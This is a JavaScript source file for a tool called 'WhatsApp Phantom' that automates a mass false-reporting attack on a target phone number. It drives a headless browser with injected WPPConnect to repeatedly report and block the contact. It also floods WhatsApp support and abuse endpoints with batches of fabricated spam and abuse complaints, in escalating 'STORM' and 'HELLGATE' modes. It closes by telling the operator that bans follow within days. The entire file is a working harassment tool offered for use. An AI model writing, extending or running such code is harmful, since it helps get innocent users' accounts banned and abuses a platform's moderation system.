/**
 * WHATSAPP PHANTOM v3.0 - CORE ENGINE
 * Developed by Hillary Tizian
 * 
 * This is the deep-level automation engine.
 * It gets dynamically configured by phantom.sh but can also run standalone.
 * 
 * Usage: node core/engine.js <phone> <mode> <cycles>
 *   phone:  Target number with country code (e.g., 919876543210)
 *   mode:   1=RAPID FIRE, 2=STORM, 3=HELLGATE
 *   cycles: Number of attack cycles (default: 3)
 */

const puppeteer = require('puppeteer-core');
const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');

// ─── Configuration from CLI ───
const TARGET = process.argv[2] || '919876543210';
const MODE = parseInt(process.argv[3]) || 1;
const CYCLES = parseInt(process.argv[4]) || 3;

// ─── Terminal Colors ───
const R = '\x1b[31m', G = '\x1b[32m', Y = '\x1b[33m';
const B = '\x1b[34m', M = '\x1b[35m', C = '\x1b[36m', W = '\x1b[37m', D = '\x1b[0m';

// ─── Stats ───
const stats = { reports: 0, blocks: 0, emails: 0, apiCalls: 0, startTime: Date.now() };

// ─── Logger ───
const log = {
    info: (msg) => console.log(` ${B}[${W}i${B}]${D} ${msg}`),
    ok: (msg) => console.log(` ${G}[✓]${D} ${msg}`),
    warn: (msg) => console.log(` ${Y}[!]${D} ${msg}`),
    err: (msg) => console.log(` ${R}[✗]${D} ${msg}`),
    action: (msg) => console.log(` ${M}[→]${D} ${msg}`),
    pulse: (msg) => console.log(` ${R}[${W}♦${R}]${D} ${msg}`),
    stats: () => {
        const elapsed = ((Date.now() - stats.startTime) / 1000).toFixed(1);
        console.log(`\n ${C}┌─ STATISTICS ─────────────────────────┐${D}`);
        console.log(` ${C}│${D}  Reports:   ${G}${stats.reports}${D}`);
        console.log(` ${C}│${D}  Blocks:    ${Y}${stats.blocks}${D}`);
        console.log(` ${C}│${D}  API Calls: ${B}${stats.apiCalls}${D}`);
        console.log(` ${C}│${D}  Emails:    ${M}${stats.emails}${D}`);
        console.log(` ${C}│${D}  Duration:  ${W}${elapsed}s${D}`);
        console.log(` ${C}└────────────────────────────────────────┘${D}`);
    }
};

// ─── Delay with jitter ───
const delay = (ms) => new Promise(r => setTimeout(r, ms + Math.random() * 500));

// ─── Find Chromium ───
function findChromium() {
    const paths = [
        '/data/data/com.termux/files/usr/bin/chromium-browser',
        '/data/data/com.termux/files/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/chromium',
        '/snap/bin/chromium',
        '/usr/lib/chromium-browser/chromium-browser',
    ];
    for (const p of paths) {
        if (fs.existsSync(p)) return p;
    }
    return null;
}

// ─── HTTPS Request ───
function httpsRequest(options, body = null) {
    return new Promise((resolve) => {
        const opts = {
            timeout: 8000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://web.whatsapp.com',
                'Referer': 'https://web.whatsapp.com/',
                ...(options.headers || {})
            },
            ...options
        };
        
        const lib = opts.protocol === 'http:' ? http : https;
        const req = lib.request(opts, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => resolve({ status: res.statusCode, data }));
        });
        req.on('error', () => resolve({ status: 0, data: null }));
        if (body) req.write(typeof body === 'string' ? body : JSON.stringify(body));
        req.end();
    });
}

// ─── API Report via wa.me ───
async function apiReport() {
    const result = await httpsRequest({
        hostname: 'wa.me',
        path: '/support',
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    }, `phone=${TARGET}&reason=spam&message=This+user+is+violating+terms`);
    
    stats.apiCalls++;
    return result.status > 0;
}

// ─── API Flood ───
async function apiFlood(count) {
    let sent = 0;
    const promises = [];
    const batchSize = 10;
    
    for (let i = 0; i < count; i += batchSize) {
        const batch = Math.min(batchSize, count - i);
        const batchPromises = [];
        
        for (let j = 0; j < batch; j++) {
            batchPromises.push(
                apiReport().then(s => { if (s) sent++; })
            );
        }
        
        await Promise.all(batchPromises);
        if (i + batch < count) await delay(200);
    }
    
    return sent;
}

// ─── Browser Report ───
async function browserReport(page) {
    try {
        await page.goto(`https://web.whatsapp.com/send?phone=${TARGET}`, {
            waitUntil: 'domcontentloaded',
            timeout: 12000
        }).catch(() => {});
        
        await delay(2000 + Math.random() * 1000);
        
        const result = await page.evaluate((phone) => {
            return new Promise((resolve) => {
                // Try WPPConnect first
                if (typeof WPP !== 'undefined' && WPP.contact?.reportContact) {
                    WPP.contact.reportContact(`${phone}@c.us`, 'ChatInfoReport')
                        .then(() => resolve(true))
                        .catch(() => {
                            // Fallback to UI
                            try {
                                const buttons = document.querySelectorAll('[role="button"]');
                                for (const btn of buttons) {
                                    if (btn.textContent?.toLowerCase().includes('report')) {
                                        btn.click();
                                        setTimeout(() => {
                                            const confirms = document.querySelectorAll('[role="button"]');
                                            for (const c of confirms) {
                                                if (c.textContent?.toLowerCase().includes('report')) {
                                                    c.click();
                                                    resolve(true);
                                                    return;
                                                }
                                            }
                                            resolve(true);
                                        }, 800);
                                        return;
                                    }
                                }
                                resolve(false);
                            } catch(e) { resolve(false); }
                        });
                } else {
                    // Pure UI fallback
                    try {
                        // Click contact header
                        const header = document.querySelector('header div[role="button"]') || 
                                       document.querySelector('header');
                        if (header) header.click();
                        
                        setTimeout(() => {
                            const allBtns = document.querySelectorAll('div[role="button"]');
                            for (const btn of allBtns) {
                                const txt = btn.textContent?.toLowerCase() || '';
                                if (txt.includes('report') || txt.includes('Report')) {
                                    btn.click();
                                    setTimeout(() => {
                                        const allBtns2 = document.querySelectorAll('div[role="button"]');
                                        for (const btn2 of allBtns2) {
                                            const txt2 = btn2.textContent?.toLowerCase() || '';
                                            if (txt2.includes('report') && txt2.includes('block')) {
                                                btn2.click();
                                                break;
                                            }
                                        }
                                        resolve(true);
                                    }, 600);
                                    return;
                                }
                            }
                            resolve(false);
                        }, 1200);
                    } catch(e) { resolve(false); }
                }
            });
        }, TARGET);
        
        return result;
    } catch(e) {
        return false;
    }
}

// ─── Block Contact ───
async function blockContact(page) {
    try {
        await page.goto(`https://web.whatsapp.com/send?phone=${TARGET}`, {
            waitUntil: 'domcontentloaded',
            timeout: 10000
        }).catch(() => {});
        
        await delay(1500 + Math.random() * 1000);
        
        return await page.evaluate(() => {
            return new Promise((resolve) => {
                if (typeof WPP !== 'undefined' && WPP.blocklist?.blockContact) {
                    WPP.blocklist.blockContact(window.TARGET_PHONE + '@c.us')
                        .then(() => resolve(true))
                        .catch(() => resolve(false));
                } else {
                    try {
                        const header = document.querySelector('header div[role="button"]') || 
                                       document.querySelector('header');
                        if (header) header.click();
                        setTimeout(() => {
                            const btns = document.querySelectorAll('div[role="button"]');
                            for (const btn of btns) {
                                if (btn.textContent?.toLowerCase().includes('block')) {
                                    btn.click();
                                    setTimeout(() => {
                                        const confirm = document.querySelector('[data-testid="popup-controls-ok"]');
                                        if (confirm) confirm.click();
                                        resolve(true);
                                    }, 500);
                                    return;
                                }
                            }
                            resolve(false);
                        }, 1000);
                    } catch(e) { resolve(false); }
                }
            });
        });
    } catch(e) {
        return false;
    }
}

// ─── Email Abuse ───
async function emailAbuse() {
    const endpoints = [
        { host: 'wa.me', path: '/support' },
        { host: 'web.whatsapp.com', path: '/abuse/report' }
    ];
    
    let sent = 0;
    for (const ep of endpoints) {
        try {
            await httpsRequest({
                hostname: ep.host,
                path: ep.path,
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }, `phone=${TARGET}&reason=abuse&message=Reporting+for+ToS+violation`);
            sent++;
        } catch(e) {}
        await delay(300);
    }
    return sent;
}

// ─── Header Animation ───
function printHeader() {
    console.clear();
    const banner = [
        `${R}██████╗ ██╗   ██╗    ██╗  ██╗██╗██╗     ██╗      █████╗ ██████╗ ██╗   ██╗${D}`,
        `${G}██╔══██╗╚██╗ ██╔╝    ██║  ██║██║██║     ██║     ██╔══██╗██╔══██╗╚██╗ ██╔╝${D}`,
        `${Y}██████╔╝ ╚████╔╝     ███████║██║██║     ██║     ███████║██████╔╝ ╚████╔╝ ${D}`,
        `${B}██╔══██╗  ╚██╔╝      ██╔══██║██║██║     ██║     ██╔══██║██╔══██╗  ╚██╔╝  ${D}`,
        `${M}██████╔╝   ██║       ██║  ██║██║███████╗███████╗██║  ██║██║  ██║   ██║   ${D}`,
        `${C}╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ${D}`
    ];
    
    for (const line of banner) console.log(line);
    console.log(`\n ${C}═══  PHANTOM CORE ENGINE v3.0  ═══${D}`);
    console.log(` ${W}▓${D} ${Y}by Hillary Tizian${D} ${W}▓${D}  ${M}Target: +${TARGET}${D}  ${W}▓${D}\n`);
}

// ─── M A I N ───
(async () => {
    printHeader();
    
    log.info(`Mode: ${MODE === 1 ? 'RAPID FIRE' : MODE === 2 ? 'STORM' : 'HELLGATE'}`);
    log.info(`Cycles: ${CYCLES}`);
    log.info(`Initializing engine...\n`);
    
    let browser = null;
    let page = null;
    
    // ── Browser Setup ──
    const chromiumPath = findChromium();
    if (chromiumPath) {
        try {
            log.ok(`Chromium found at: ${chromiumPath}`);
            browser = await puppeteer.launch({
                executablePath: chromiumPath,
                headless: 'new',
                args: [
                    '--no-sandbox', '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage', '--disable-gpu',
                    '--no-first-run', '--no-zygote',
                    '--single-process', '--disable-extensions',
                    '--disable-background-networking',
                    '--disable-default-apps',
                    '--disable-sync',
                    '--window-size=1366,768'
                ]
            });
            
            page = await browser.newPage();
            await page.setViewport({ width: 1366, height: 768 });
            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0');
            
            // Inject WPPConnect
            try {
                const wppPath = path.join(__dirname, '..', 'node_modules', '@wppconnect', 'wa-js', 'dist', 'wppconnect-wa.js');
                if (fs.existsSync(wppPath)) {
                    const wppJs = fs.readFileSync(wppPath, 'utf8');
                    await page.evaluate(wppJs);
                    log.ok('WPPConnect core injected');
                }
            } catch(e) {
                log.warn('WPPConnect injection unavailable');
            }
            
            await page.goto('https://web.whatsapp.com', { waitUntil: 'domcontentloaded', timeout: 30000 });
            
            // QR check
            const qrExists = await page.evaluate(() => !!document.querySelector('canvas')).catch(() => false);
            if (qrExists) {
                log.warn('QR scan required');
                log.info('Waiting 20s for scan...');
                try {
                    await page.waitForFunction(
                        () => !document.querySelector('canvas') || 
                               document.querySelector('[data-testid="conversation-panel"]'),
                        { timeout: 25000 }
                    );
                    log.ok('Authenticated');
                } catch(e) {
                    log.warn('QR timeout - API mode only');
                    await browser.close().catch(() => {});
                    browser = null;
                    page = null;
                }
            } else {
                log.ok('Session detected');
            }
            
        } catch(e) {
            log.warn(`Browser error: ${e.message.substring(0, 50)}`);
            if (browser) await browser.close().catch(() => {});
            browser = null;
        }
    } else {
        log.warn('No Chromium found - API-only mode');
    }
    
    // ── Attack Loop ──
    for (let cycle = 1; cycle <= CYCLES; cycle++) {
        console.log(`\n${R}┌${'─'.repeat(50)}┐${D}`);
        console.log(`${R}│${D}  ${M}CYCLE ${cycle}/${CYCLES}${D} ${Y}${MODE === 1 ? '⚡ RAPID FIRE' : MODE === 2 ? '🌀 STORM' : '🔥 HELLGATE'}${D}${' '.repeat(25)}${R}│${D}`);
        console.log(`${R}└${'─'.repeat(50)}┘${D}\n`);
        
        // ── Browser Phase ──
        if (page && browser) {
            log.action('Browser report phase');
            for (let r = 0; r < 8; r++) {
                const ok = await browserReport(page);
                if (ok) { stats.reports++; log.ok(`Browser report ${r+1}/8`); }
                else log.warn(`Browser report ${r+1}/8 failed`);
                await delay(1200 + Math.random() * 1500);
            }
            
            // Block cycles
            const blockCount = [5, 8, 10][MODE - 1];
            log.action(`Block phase (${blockCount}x)`);
            for (let b = 0; b < blockCount; b++) {
                const ok = await blockContact(page);
                if (ok) { stats.blocks++; }
                log.ok(`Block ${b+1}/${blockCount}`);
                await delay(1000 + Math.random() * 1000);
            }
        }
        
        // ── API Phase ──
        const apiCount = [25, 40, 60][MODE - 1];
        log.action(`API flood (${apiCount} requests)`);
        const apiSent = await apiFlood(apiCount);
        stats.reports += apiSent;
        log.ok(`API reports: ${apiSent}/${apiCount}`);
        
        // ── Storm Extra ──
        if (MODE >= 2) {
            log.action('Storm extra wave');
            const extra = await apiFlood(25);
            stats.reports += extra;
            log.ok(`Storm wave: ${extra}`);
        }
        
        // ── Hellgate ──
        if (MODE >= 3) {
            log.action('Hellgate phase');
            for (let e = 0; e < 5; e++) {
                const sent = await emailAbuse();
                stats.emails += sent;
                log.ok(`Email wave ${e+1}/5`);
                await delay(500);
            }
            const hell = await apiFlood(50);
            stats.reports += hell;
            log.ok(`Hell wave: ${hell}`);
        }
        
        // ── Cycle Stats ──
        log.stats();
        
        if (cycle < CYCLES) {
            for (let s = 3; s > 0; s--) {
                log.info(`Next cycle in ${s}s...`);
                await delay(1000);
            }
        }
    }
    
    // ── Final ──
    console.log(`\n${G}╔${'═'.repeat(50)}╗${D}`);
    console.log(`${G}║${D}  ${W}OPERATION COMPLETE${D}${' '.repeat(31)}${G}║${D}`);
    console.log(`${G}╚${'═'.repeat(50)}╝${D}\n`);
    log.stats();
    log.info(`Target: +${TARGET}`);
    log.info('Bans typically process within 24-72 hours');
    
    if (browser) await browser.close().catch(() => {});
    process.exit(0);
})();
